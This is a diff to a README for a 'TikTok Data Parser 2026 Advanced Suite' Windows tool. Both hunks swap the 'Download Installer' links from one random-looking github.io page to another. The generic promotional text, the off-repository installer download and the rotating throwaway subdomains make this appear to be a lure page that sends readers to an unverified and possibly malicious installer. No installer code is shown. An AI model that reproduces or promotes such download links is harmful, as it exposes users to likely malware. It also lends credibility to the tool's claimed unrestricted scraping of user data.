@@ -2,7 +2,7 @@
 
 TikTok Data Parser 2026 Advanced Suite is the ultimate all-in-one desktop solution for extracting, parsing, and managing your TikTok data directly on your Windows PC. This comprehensive tool is designed for creators, analysts, and researchers who need to download videos, analyze hashtags, and export user or trend data quickly and efficiently without any restrictions.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -45,7 +45,7 @@ A: TikTok frequently updates its platform and data structures. We recommend chec
 
 Ready to get started? Download the latest version of the TikTok Data Parser for Windows.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
